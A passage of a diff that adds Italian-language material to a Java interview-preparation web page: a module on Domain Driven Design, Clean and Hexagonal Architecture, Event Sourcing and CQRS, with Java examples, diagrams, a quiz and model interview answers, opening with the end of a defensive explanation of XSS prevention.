+                    <p><strong>Risposta attesa:</strong> XSS (Cross-Site Scripting): l'attacker inietta script malevolo che viene eseguito nel browser della vittima. Tipi: Stored (script salvato in DB), Reflected (script nell'URL riflesso nella risposta), DOM-based (manipolazione DOM client-side). Prevenzione: 1) Output encoding/escaping: tutto l'output user-generated deve essere escaped per il contesto (HTML, JS, URL). 2) Content Security Policy (CSP): header che blocca inline scripts. 3) HttpOnly cookies: JS non può accedere ai cookie di sessione. 4) Validazione input (whitelist). In Spring: Thymeleaf usa th:text (escaped) di default, evitare th:utext.</p>
+                </div>
+            </section>
+
+            <!-- ==================== MODULO 11: DDD & CLEAN ARCHITECTURE ==================== -->
+
+            <header class="module-header" id="modulo11">
+                <span class="module-tag">Modulo 11</span>
+                <h1>DDD & Clean Architecture</h1>
+                <p>Domain Driven Design, Hexagonal Architecture, Event Sourcing e CQRS</p>
+            </header>
+
+            <!-- DDD Section -->
+            <section class="section" id="modulo11-ddd">
+                <h2>Domain Driven Design (DDD)</h2>
+
+                <p><strong>Domain Driven Design</strong> è un approccio allo sviluppo software che mette il dominio di business al centro dell'architettura. Invece di partire dal database o dall'UI, parti dalla comprensione profonda del problema di business.</p>
+
+                <h3>Ubiquitous Language</h3>
+
+                <p>Il <strong>Ubiquitous Language</strong> è un linguaggio condiviso tra sviluppatori e domain experts. Ogni termine ha un significato preciso usato ovunque: codice, documentazione, conversazioni.</p>
+
+                <pre><code class="language-java">// ❌ SENZA Ubiquitous Language
+class DataProcessor {
+    void processItem(Item item, int statusCode) {
+        if (statusCode == 1) { ... }  // Cosa significa 1?
+    }
+}
+
+// ✅ CON Ubiquitous Language
+class OrderService {
+    void shipOrder(Order order) {
+        order.markAsShipped();  // Linguaggio del dominio
+    }
+}
+
+enum OrderStatus {
+    PENDING_PAYMENT,
+    PAYMENT_CONFIRMED,
+    SHIPPED,
+    DELIVERED,
+    CANCELLED
+}</code></pre>
+
+                <h3>Bounded Contexts</h3>
+
+                <p>Un <strong>Bounded Context</strong> è un confine esplicito dentro il quale un modello di dominio è valido. Lo stesso termine può avere significati diversi in contesti diversi.</p>
+
+                <div class="diagram">
+                    <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        BOUNDED CONTEXTS - E-Commerce                         │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  ┌─────────────────────┐    ┌─────────────────────┐    ┌─────────────────┐ │
+│  │   SALES CONTEXT     │    │  INVENTORY CONTEXT  │    │ SHIPPING CONTEXT│ │
+│  │                     │    │                     │    │                 │ │
+│  │  "Product" =        │    │  "Product" =        │    │  "Product" =    │ │
+│  │   - name            │    │   - SKU             │    │   - weight      │ │
+│  │   - price           │    │   - quantity        │    │   - dimensions  │ │
+│  │   - description     │    │   - warehouse       │    │   - fragile     │ │
+│  │   - images          │    │   - reorderLevel    │    │                 │ │
+│  │                     │    │                     │    │                 │ │
+│  │  "Customer" =       │    │  (no Customer)      │    │  "Customer" =   │ │
+│  │   - name            │    │                     │    │   - address     │ │
+│  │   - email           │    │                     │    │   - phone       │ │
+│  │   - preferences     │    │                     │    │                 │ │
+│  └──────────┬──────────┘    └──────────┬──────────┘    └────────┬────────┘ │
+│             │                          │                        │          │
+│             └──────────────────────────┼────────────────────────┘          │
+│                          Context Mapping (Integration)                      │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+                    </pre>
+                </div>
+
+                <h3>Building Blocks del DDD</h3>
+
+                <h4>Entity vs Value Object</h4>
+
+                <pre><code class="language-java">// ENTITY: ha identità, può cambiare stato
+// Due ordini con stesso contenuto sono DIVERSI se hanno ID diverso
+@Entity
+public class Order {
+    @Id
+    private OrderId id;  // Identità
+    private OrderStatus status;
+    private List&lt;OrderLine&gt; lines;
+
+    // Può cambiare stato
+    public void addItem(Product product, int quantity) { ... }
+    public void markAsShipped() { this.status = OrderStatus.SHIPPED; }
+
+    // Uguaglianza basata su ID
+    @Override
+    public boolean equals(Object o) {
+        return o instanceof Order other && this.id.equals(other.id);
+    }
+}
+
+// VALUE OBJECT: immutabile, definito dai suoi attributi
+// Due Money con stesso amount e currency sono UGUALI
+public record Money(BigDecimal amount, Currency currency) {
+    public Money {
+        if (amount.compareTo(BigDecimal.ZERO) &lt; 0) {
+            throw new IllegalArgumentException("Amount cannot be negative");
+        }
+    }
+
+    public Money add(Money other) {
+        if (!this.currency.equals(other.currency)) {
+            throw new IllegalArgumentException("Cannot add different currencies");
+        }
+        return new Money(this.amount.add(other.amount), this.currency);
+    }
+
+    // Uguaglianza basata sui valori (automatico con record)
+}
+
+// Altro Value Object
+public record Address(String street, String city, String zipCode, String country) {
+    // Immutabile, uguaglianza per valore
+}</code></pre>
+
+                <h4>Aggregate e Aggregate Root</h4>
+
+                <p>Un <strong>Aggregate</strong> è un cluster di oggetti trattati come unità per le modifiche. L'<strong>Aggregate Root</strong> è l'unico punto di accesso all'aggregate.</p>
+
+                <pre><code class="language-java">// Order è l'Aggregate Root
+// OrderLine esiste solo dentro Order
+public class Order {  // Aggregate Root
+    private OrderId id;
+    private CustomerId customerId;
+    private List&lt;OrderLine&gt; lines = new ArrayList&lt;&gt;();  // Parte dell'aggregate
+    private Money total;
+
+    // ✅ Le modifiche passano SEMPRE dall'Aggregate Root
+    public void addItem(ProductId productId, int quantity, Money price) {
+        // Invarianti di business qui
+        if (this.status != OrderStatus.DRAFT) {
+            throw new IllegalStateException("Cannot modify non-draft order");
+        }
+
+        var existingLine = findLine(productId);
+        if (existingLine.isPresent()) {
+            existingLine.get().increaseQuantity(quantity);
+        } else {
+            lines.add(new OrderLine(productId, quantity, price));
+        }
+
+        recalculateTotal();
+    }
+
+    // ❌ MAI esporre la lista interna
+    // public List&lt;OrderLine&gt; getLines() { return lines; }
+
+    // ✅ Esponi una vista immutabile
+    public List&lt;OrderLine&gt; getLines() {
+        return Collections.unmodifiableList(lines);
+    }
+}
+
+// OrderLine NON è accessibile direttamente dall'esterno
+class OrderLine {  // Parte dell'aggregate, NON root
+    private ProductId productId;
+    private int quantity;
+    private Money unitPrice;
+
+    void increaseQuantity(int amount) {
+        this.quantity += amount;
+    }
+}</code></pre>
+
+                <h4>Repository Pattern</h4>
+
+                <pre><code class="language-java">// Repository: astrazione per persistenza degli Aggregate
+public interface OrderRepository {
+    Order findById(OrderId id);
+    void save(Order order);
+    void delete(OrderId id);
+
+    // Query specifiche del dominio
+    List&lt;Order&gt; findByCustomer(CustomerId customerId);
+    List&lt;Order&gt; findPendingOrdersOlderThan(Duration duration);
+}
+
+// Implementazione con JPA
+@Repository
+class JpaOrderRepository implements OrderRepository {
+    private final OrderJpaRepository jpaRepo;
+    private final OrderMapper mapper;
+
+    @Override
+    public Order findById(OrderId id) {
+        return jpaRepo.findById(id.value())
+            .map(mapper::toDomain)
+            .orElseThrow(() -> new OrderNotFoundException(id));
+    }
+
+    @Override
+    public void save(Order order) {
+        var entity = mapper.toEntity(order);
+        jpaRepo.save(entity);
+    }
+}</code></pre>
+
+                <h4>Domain Events</h4>
+
+                <pre><code class="language-java">// Domain Event: qualcosa di importante che è successo nel dominio
+public record OrderPlaced(
+    OrderId orderId,
+    CustomerId customerId,
+    Money total,
+    Instant occurredAt
+) implements DomainEvent {}
+
+public record OrderShipped(
+    OrderId orderId,
+    TrackingNumber trackingNumber,
+    Instant occurredAt
+) implements DomainEvent {}
+
+// L'Aggregate Root pubblica eventi
+public class Order {
+    private List&lt;DomainEvent&gt; domainEvents = new ArrayList&lt;&gt;();
+
+    public void place() {
+        if (lines.isEmpty()) {
+            throw new IllegalStateException("Cannot place empty order");
+        }
+        this.status = OrderStatus.PLACED;
+        domainEvents.add(new OrderPlaced(id, customerId, total, Instant.now()));
+    }
+
+    public List&lt;DomainEvent&gt; getDomainEvents() {
+        return List.copyOf(domainEvents);
+    }
+
+    public void clearDomainEvents() {
+        domainEvents.clear();
+    }
+}
+
+// Event handler in altro bounded context
+@Component
+class InventoryEventHandler {
+    @EventListener
+    public void on(OrderPlaced event) {
+        // Riserva gli item in inventario
+        inventoryService.reserveItems(event.orderId());
+    }
+}</code></pre>
+            </section>
+
+            <!-- Clean Architecture Section -->
+            <section class="section" id="modulo11-clean">
+                <h2>Clean Architecture & Hexagonal</h2>
+
+                <p>La <strong>Clean Architecture</strong> (Uncle Bob) e l'<strong>Hexagonal Architecture</strong> (Ports & Adapters) condividono lo stesso principio: il dominio al centro, le dipendenze puntano verso l'interno.</p>
+
+                <div class="diagram">
+                    <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        CLEAN ARCHITECTURE                                    │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│                    ┌─────────────────────────────────┐                      │
+│                    │     FRAMEWORKS & DRIVERS        │  ← Web, DB, UI       │
+│                    │     (Infrastructure)            │                      │
+│                    │  ┌─────────────────────────┐    │                      │
+│                    │  │   INTERFACE ADAPTERS    │    │  ← Controllers,      │
+│                    │  │   (Adapters)            │    │    Gateways,         │
+│                    │  │  ┌─────────────────┐    │    │    Presenters        │
+│                    │  │  │   USE CASES     │    │    │                      │
+│                    │  │  │  (Application)  │    │    │  ← Business rules    │
+│                    │  │  │  ┌─────────┐    │    │    │                      │
+│                    │  │  │  │ ENTITIES│    │    │    │  ← Enterprise        │
+│                    │  │  │  │ (Domain)│    │    │    │    business rules    │
+│                    │  │  │  └─────────┘    │    │    │                      │
+│                    │  │  └─────────────────┘    │    │                      │
+│                    │  └─────────────────────────┘    │                      │
+│                    └─────────────────────────────────┘                      │
+│                                                                              │
+│  DEPENDENCY RULE: Le dipendenze puntano solo VERSO L'INTERNO               │
+│  Il Domain non conosce Spring, JPA, HTTP, etc.                              │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+                    </pre>
+                </div>
+
+                <h3>Hexagonal Architecture (Ports & Adapters)</h3>
+
+                <div class="diagram">
+                    <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        HEXAGONAL ARCHITECTURE                                │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│        DRIVING ADAPTERS                           DRIVEN ADAPTERS           │
+│        (Input)                                    (Output)                  │
+│                                                                              │
+│  ┌─────────────┐       ┌─────────────────────┐       ┌─────────────┐       │
+│  │ REST        │──────▶│     APPLICATION     │──────▶│ PostgreSQL  │       │
+│  │ Controller  │       │                     │       │ Repository  │       │
+│  └─────────────┘       │  ┌───────────────┐  │       └─────────────┘       │
+│                        │  │               │  │                              │
+│  ┌─────────────┐       │  │    DOMAIN     │  │       ┌─────────────┐       │
+│  │ GraphQL     │──────▶│  │               │  │──────▶│ Kafka       │       │
+│  │ Resolver    │       │  │   (Entities,  │  │       │ Publisher   │       │
+│  └─────────────┘       │  │  Value Objects│  │       └─────────────┘       │
+│                        │  │   Services)   │  │                              │
+│  ┌─────────────┐       │  │               │  │       ┌─────────────┐       │
+│  │ CLI         │──────▶│  └───────────────┘  │──────▶│ Email       │       │
+│  │ Command     │       │                     │       │ Service     │       │
+│  └─────────────┘       │  Uses Ports         │       └─────────────┘       │
+│                        │  (interfaces)       │                              │
+│        ▲               └─────────────────────┘               ▲              │
+│        │                                                     │              │
+│   INBOUND PORTS                                    OUTBOUND PORTS          │
+│   (Use Cases)                                      (Repository,            │
+│                                                    EventPublisher)         │
+└─────────────────────────────────────────────────────────────────────────────┘
+                    </pre>
+                </div>
+
+                <pre><code class="language-java">// ════════════════════════════════════════════════════════════════
+// DOMAIN LAYER (centro - nessuna dipendenza esterna)
+// ════════════════════════════════════════════════════════════════
+
+// Entità di dominio pura
+public class Order {
+    private OrderId id;
+    private List&lt;OrderLine&gt; lines;
+    private OrderStatus status;
+
+    public void place() { ... }
+    public void ship(TrackingNumber tracking) { ... }
+}
+
+// ════════════════════════════════════════════════════════════════
+// APPLICATION LAYER (Use Cases)
+// ════════════════════════════════════════════════════════════════
+
+// INBOUND PORT: definisce cosa l'applicazione può fare
+public interface PlaceOrderUseCase {
+    OrderId execute(PlaceOrderCommand command);
+}
+
+public record PlaceOrderCommand(
+    CustomerId customerId,
+    List&lt;OrderItemCommand&gt; items
+) {}
+
+// USE CASE implementation
+@Service
+@Transactional
+public class PlaceOrderService implements PlaceOrderUseCase {
+    private final OrderRepository orderRepository;      // Outbound port
+    private final CustomerRepository customerRepository;
+    private final EventPublisher eventPublisher;        // Outbound port
+
+    @Override
+    public OrderId execute(PlaceOrderCommand command) {
+        Customer customer = customerRepository.findById(command.customerId())
+            .orElseThrow(() -> new CustomerNotFoundException(command.customerId()));
+
+        Order order = Order.create(customer.getId());
+        command.items().forEach(item ->
+            order.addItem(item.productId(), item.quantity(), item.price())
+        );
+        order.place();
+
+        orderRepository.save(order);
+        order.getDomainEvents().forEach(eventPublisher::publish);
+
+        return order.getId();
+    }
+}
+
+// OUTBOUND PORTS (interfaces definite nel domain/application layer)
+public interface OrderRepository {
+    Optional&lt;Order&gt; findById(OrderId id);
+    void save(Order order);
+}
+
+public interface EventPublisher {
+    void publish(DomainEvent event);
+}
+
+// ════════════════════════════════════════════════════════════════
+// INFRASTRUCTURE LAYER (Adapters)
+// ════════════════════════════════════════════════════════════════
+
+// INBOUND ADAPTER: REST Controller
+@RestController
+@RequestMapping("/orders")
+public class OrderController {
+    private final PlaceOrderUseCase placeOrderUseCase;  // Dipende dal PORT
+
+    @PostMapping
+    public ResponseEntity&lt;OrderResponse&gt; placeOrder(@RequestBody PlaceOrderRequest request) {
+        var command = new PlaceOrderCommand(
+            new CustomerId(request.customerId()),
+            request.items().stream().map(this::toCommand).toList()
+        );
+        OrderId orderId = placeOrderUseCase.execute(command);
+        return ResponseEntity.created(URI.create("/orders/" + orderId)).build();
+    }
+}
+
+// OUTBOUND ADAPTER: JPA Repository
+@Repository
+public class JpaOrderRepository implements OrderRepository {
+    private final OrderJpaRepository jpaRepo;
+    private final OrderMapper mapper;
+
+    @Override
+    public void save(Order order) {
+        jpaRepo.save(mapper.toEntity(order));
+    }
+}
+
+// OUTBOUND ADAPTER: Kafka Publisher
+@Component
+public class KafkaEventPublisher implements EventPublisher {
+    private final KafkaTemplate&lt;String, Object&gt; kafka;
+
+    @Override
+    public void publish(DomainEvent event) {
+        kafka.send("domain-events", event);
+    }
+}</code></pre>
+            </section>
+
+            <!-- CQRS & Event Sourcing Section -->
+            <section class="section" id="modulo11-cqrs">
+                <h2>Event Sourcing & CQRS</h2>
+
+                <h3>Event Sourcing</h3>
+
+                <p>In <strong>Event Sourcing</strong>, invece di salvare lo stato corrente, salvi la sequenza di eventi che hanno portato a quello stato. Lo stato è derivato riapplicando gli eventi.</p>
+
+                <div class="diagram">
+                    <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        EVENT SOURCING                                        │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  TRADITIONAL (State)              EVENT SOURCING                            │
+│  ─────────────────────            ──────────────────                         │
+│                                                                              │
+│  Account Table:                   Event Store:                              │
+│  ┌─────────────────┐              ┌──────────────────────────────────────┐  │
+│  │ id: 123         │              │ 1. AccountCreated(id=123, name=John) │  │
+│  │ balance: 150    │    vs        │ 2. MoneyDeposited(id=123, amount=200)│  │
+│  │ name: John      │              │ 3. MoneyWithdrawn(id=123, amount=50) │  │
+│  └─────────────────┘              └──────────────────────────────────────┘  │
+│                                                                              │
+│  "Cosa c'è adesso"                "Cosa è successo" → ricostruisci stato    │
+│                                                                              │
+│  Pro Event Sourcing:                                                        │
+│  ✓ Audit trail completo (chi ha fatto cosa, quando)                        │
+│  ✓ Time travel: ricostruisci stato a qualsiasi punto                       │
+│  ✓ Debug: replay eventi per riprodurre bug                                 │
+│  ✓ Event-driven architecture naturale                                       │
+│                                                                              │
+│  Contro:                                                                     │
+│  ✗ Complessità (eventual consistency, versioning eventi)                   │
+│  ✗ Query complesse richiedono proiezioni (→ CQRS)                          │
+│  ✗ Curva di apprendimento                                                   │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+                    </pre>
+                </div>
+
+                <pre><code class="language-java">// Aggregate con Event Sourcing
+public class Account {
+    private AccountId id;
+    private String name;
+    private Money balance;
+    private List&lt;DomainEvent&gt; uncommittedEvents = new ArrayList&lt;&gt;();
+
+    // Ricostruisci da eventi
+    public static Account fromEvents(List&lt;DomainEvent&gt; events) {
+        Account account = new Account();
+        events.forEach(account::apply);
+        return account;
+    }
+
+    // Comandi producono eventi
+    public void deposit(Money amount) {
+        if (amount.isNegative()) {
+            throw new IllegalArgumentException("Amount must be positive");
+        }
+        applyAndRecord(new MoneyDeposited(id, amount, Instant.now()));
+    }
+
+    public void withdraw(Money amount) {
+        if (balance.lessThan(amount)) {
+            throw new InsufficientFundsException(id, balance, amount);
+        }
+        applyAndRecord(new MoneyWithdrawn(id, amount, Instant.now()));
+    }
+
+    // Applica evento allo stato
+    private void apply(DomainEvent event) {
+        switch (event) {
+            case AccountCreated e -> {
+                this.id = e.accountId();
+                this.name = e.name();
+                this.balance = Money.ZERO;
+            }
+            case MoneyDeposited e -> this.balance = balance.add(e.amount());
+            case MoneyWithdrawn e -> this.balance = balance.subtract(e.amount());
+            default -> throw new IllegalArgumentException("Unknown event: " + event);
+        }
+    }
+
+    private void applyAndRecord(DomainEvent event) {
+        apply(event);
+        uncommittedEvents.add(event);
+    }
+
+    public List&lt;DomainEvent&gt; getUncommittedEvents() {
+        return List.copyOf(uncommittedEvents);
+    }
+}</code></pre>
+
+                <h3>CQRS (Command Query Responsibility Segregation)</h3>
+
+                <p><strong>CQRS</strong> separa i modelli per scrittura (Command) e lettura (Query). Ogni lato può essere ottimizzato indipendentemente.</p>
+
+                <div class="diagram">
+                    <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        CQRS PATTERN                                          │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│                              ┌─────────┐                                    │
+│                              │ Client  │                                    │
+│                              └────┬────┘                                    │
+│                         ┌─────────┴─────────┐                               │
+│                         │                   │                               │
+│                    Commands              Queries                            │
+│                    (writes)              (reads)                            │
+│                         │                   │                               │
+│                         ▼                   ▼                               │
+│               ┌─────────────────┐   ┌─────────────────┐                    │
+│               │ Command Handler │   │  Query Handler  │                    │
+│               │   (Use Cases)   │   │   (Read Model)  │                    │
+│               └────────┬────────┘   └────────┬────────┘                    │
+│                        │                     │                              │
+│                        ▼                     ▼                              │
+│               ┌─────────────────┐   ┌─────────────────┐                    │
+│               │  Write Model    │   │   Read Model    │  ← Ottimizzato     │
+│               │  (Domain/Event  │   │  (Proiezioni,   │    per query       │
+│               │   Store)        │   │   denormalizzato)│                   │
+│               └────────┬────────┘   └─────────────────┘                    │
+│                        │                     ▲                              │
+│                        │     Events          │                              │
+│                        └─────────────────────┘                              │
+│                          (Sincronizzazione)                                 │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+                    </pre>
+                </div>
+
+                <pre><code class="language-java">// COMMAND SIDE
+public record PlaceOrderCommand(CustomerId customerId, List&lt;Item&gt; items) {}
+
+@Service
+public class OrderCommandHandler {
+    private final EventStore eventStore;
+
+    public void handle(PlaceOrderCommand cmd) {
+        Order order = Order.create(cmd.customerId());
+        cmd.items().forEach(i -> order.addItem(i.productId(), i.quantity()));
+        order.place();
+
+        // Salva eventi, non stato
+        eventStore.append(order.getId(), order.getUncommittedEvents());
+    }
+}
+
+// QUERY SIDE - Read Model ottimizzato
+@Document(collection = "order_summaries")
+public class OrderSummaryReadModel {
+    private String orderId;
+    private String customerName;  // Denormalizzato!
+    private BigDecimal total;
+    private String status;
+    private int itemCount;
+    private Instant placedAt;
+}
+
+// Proiezione: ascolta eventi e aggiorna read model
+@Component
+public class OrderSummaryProjection {
+    private final OrderSummaryRepository readRepo;
+    private final CustomerRepository customerRepo;
+
+    @EventListener
+    public void on(OrderPlaced event) {
+        Customer customer = customerRepo.findById(event.customerId());
+
+        OrderSummaryReadModel summary = new OrderSummaryReadModel();
+        summary.setOrderId(event.orderId().value());
+        summary.setCustomerName(customer.getName());  // Denormalizza
+        summary.setTotal(event.total().amount());
+        summary.setStatus("PLACED");
+        summary.setPlacedAt(event.occurredAt());
+
+        readRepo.save(summary);
+    }
+
+    @EventListener
+    public void on(OrderShipped event) {
+        readRepo.updateStatus(event.orderId(), "SHIPPED");
+    }
+}
+
+// Query handler: legge dal read model (veloce, ottimizzato)
+@Service
+public class OrderQueryHandler {
+    private final OrderSummaryRepository readRepo;
+
+    public List&lt;OrderSummaryReadModel&gt; getOrdersByCustomer(String customerName) {
+        // Query diretta, no JOIN, denormalizzato
+        return readRepo.findByCustomerName(customerName);
+    }
+}</code></pre>
+
+                <div class="info-box warning">
+                    <h4>CQRS/Event Sourcing: Quando Usarli?</h4>
+                    <p><strong>Usali quando</strong>: Domini complessi con regole di business ricche, audit trail è requisito, workload read/write molto diversi, team esperti. <strong>NON usarli per</strong>: CRUD semplice, team piccoli/inesperti, MVP. La complessità aggiunta deve essere giustificata dal valore di business.</p>
+                </div>
+            </section>
+
+            <!-- Quiz Section Modulo 11 -->
+            <section class="quiz-section" id="modulo11-quiz">
+                <h2>Interactive Challenge Quiz - Modulo 11</h2>
+
+                <!-- Question 51 -->
+                <div class="quiz-question" data-correct="b">
+                    <h4><span>Q1.</span> In DDD, qual è la differenza principale tra Entity e Value Object?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q51" id="q51a" value="a">
+                            <label for="q51a">Entity è mutabile, Value Object è immutabile</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q51" id="q51b" value="b">
+                            <label for="q51b">Entity ha identità unica, Value Object è definito dai suoi attributi</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q51" id="q51c" value="c">
+                            <label for="q51c">Entity è persistita in DB, Value Object no</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q51" id="q51d" value="d">
+                            <label for="q51d">Entity ha metodi, Value Object ha solo dati</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q51')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q51"></div>
+                </div>
+
+                <!-- Question 52 -->
+                <div class="quiz-question" data-correct="c">
+                    <h4><span>Q2.</span> Perché le dipendenze in Clean Architecture puntano verso l'interno?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q52" id="q52a" value="a">
+                            <label for="q52a">Per migliorare le performance del sistema</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q52" id="q52b" value="b">
+                            <label for="q52b">Perché il database è il componente più importante</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q52" id="q52c" value="c">
+                            <label for="q52c">Per proteggere il dominio da cambiamenti nei dettagli implementativi</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q52" id="q52d" value="d">
+                            <label for="q52d">Per facilitare il deployment in microservizi</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q52')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q52"></div>
+                </div>
+
+                <!-- Question 53 -->
+                <div class="quiz-question" data-correct="a">
+                    <h4><span>Q3.</span> In Event Sourcing, come ricostruisci lo stato corrente di un Aggregate?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q53" id="q53a" value="a">
+                            <label for="q53a">Riapplichi tutti gli eventi dall'inizio in ordine cronologico</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q53" id="q53b" value="b">
+                            <label for="q53b">Leggi l'ultimo snapshot dal database</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q53" id="q53c" value="c">
+                            <label for="q53c">Fai una query SQL con i filtri appropriati</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q53" id="q53d" value="d">
+                            <label for="q53d">Deserializzi il JSON salvato nell'event store</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q53')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q53"></div>
+                </div>
+
+                <!-- Question 54 -->
+                <div class="quiz-question" data-correct="d">
+                    <h4><span>Q4.</span> In CQRS, perché il Read Model può essere denormalizzato?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q54" id="q54a" value="a">
+                            <label for="q54a">Perché i dati sono di sola lettura, non serve integrità referenziale</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q54" id="q54b" value="b">
+                            <label for="q54b">Perché le query sono meno importanti dei comandi</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q54" id="q54c" value="c">
+                            <label for="q54c">Perché MongoDB non supporta normalizzazione</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q54" id="q54d" value="d">
+                            <label for="q54d">Perché è separato dal Write Model e può essere ottimizzato per le query specifiche</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q54')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q54"></div>
+                </div>
+
+                <!-- Question 55 -->
+                <div class="quiz-question" data-correct="b">
+                    <h4><span>Q5.</span> Perché l'Aggregate Root è l'unico punto di accesso per modificare l'Aggregate?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q55" id="q55a" value="a">
+                            <label for="q55a">Per ridurre il numero di classi nel sistema</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q55" id="q55b" value="b">
+                            <label for="q55b">Per garantire che gli invarianti di business siano sempre rispettati</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q55" id="q55c" value="c">
+                            <label for="q55c">Per migliorare le performance delle query</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q55" id="q55d" value="d">
+                            <label for="q55d">Perché JPA richiede una singola Entity root</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q55')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q55"></div>
+                </div>
+            </section>
+
+            <!-- Questions Section Modulo 11 -->
+            <section class="section" id="modulo11-questions">
+                <h2>Domande da Colloquio - Modulo 11</h2>
+
+                <div class="info-box">
+                    <h4>Q: Spiega cosa sono i Bounded Context e perché sono importanti.</h4>
+                    <p><strong>Risposta attesa:</strong> Un Bounded Context è un confine esplicito dove un modello di dominio è valido. Lo stesso termine può avere significati diversi in contesti diversi - "Product" nel Sales context ha prezzo e descrizione, nel Warehouse context ha SKU e posizione scaffale. Sono importanti perché: 1) Evitano un modello "god class" che cerca di rappresentare tutto. 2) Permettono a team diversi di lavorare indipendentemente. 3) Permettono scelte tecniche diverse per contesto. 4) Mappano naturalmente ai microservizi. I contesti comunicano tramite Context Mapping (ACL, Open Host, etc.).</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Q: Qual è la differenza tra Clean Architecture e Hexagonal Architecture?</h4>
+                    <p><strong>Risposta attesa:</strong> Condividono lo stesso principio fondamentale: il dominio al centro, dipendenze verso l'interno. Clean Architecture (Uncle Bob) enfatizza i layer concentrici: Entities → Use Cases → Interface Adapters → Frameworks. Hexagonal (Ports & Adapters, Alistair Cockburn) enfatizza la simmetria: il dominio al centro con porte (interfacce) e adattatori (implementazioni) sia per input (driving) che output (driven). In pratica sono molto simili. La differenza principale è il vocabolario: Clean usa "layers", Hexagonal usa "ports/adapters".</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Q: Quando useresti Event Sourcing invece di CRUD tradizionale?</h4>
+                    <p><strong>Risposta attesa:</strong> Event Sourcing quando: 1) Audit trail è un requisito (finanza, healthcare, legal). 2) Vuoi "time travel" - ricostruire stato a qualsiasi momento. 3) Il dominio è naturalmente event-driven. 4) Vuoi debugging avanzato (replay eventi). 5) Analytics storiche complesse. NON usare per: CRUD semplice, team senza esperienza, quando la complessità non è giustificata. Il costo è: eventual consistency, versioning eventi, gestione proiezioni. Può essere applicato solo ad alcuni aggregate, non a tutto il sistema.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Q: Come gestisci la consistenza tra Read e Write model in CQRS?</h4>
+                    <p><strong>Risposta attesa:</strong> La consistenza è eventuale, non immediata. Il Write model salva eventi/stato, poi il Read model si aggiorna asincronamente (via eventi, message queue, o polling). Strategie: 1) Accettare eventual consistency (la UI può mostrare "processing"). 2) Read-your-writes: dopo un comando, la UI legge direttamente dal Write model per quella entità. 3) Polling con retry finché il Read model si aggiorna. 4) WebSocket/SSE per notificare quando il Read model è pronto. La latenza tipica è millisecondi-secondi. Per operazioni critiche, usa transazioni distribuite o saga pattern.</p>
+                </div>
+            </section>
+
         </main>
     </div>
 
@@ -9174,6 +11542,98 @@ String result = switch (findUser("123")) {
                     a: '❌ Sbagliato. L\'immutabilità può aumentare l\'uso di memoria (ogni "modifica" crea un nuovo oggetto). La condivisione è safe ma non necessariamente riduce memoria.',
                     b: '❌ Sbagliato. Il GC non lavora "più efficientemente" con oggetti immutabili. Anzi, creare molti oggetti può aumentare la pressione sul GC.',
                     d: '❌ Sbagliato. L\'immutabilità non rende automaticamente il codice più veloce. Il vantaggio è la sicurezza thread-safe, non la raw performance.'
+                }
+            },
+            // Modulo 9: API Design
+            q41: {
+                correct: 'b',
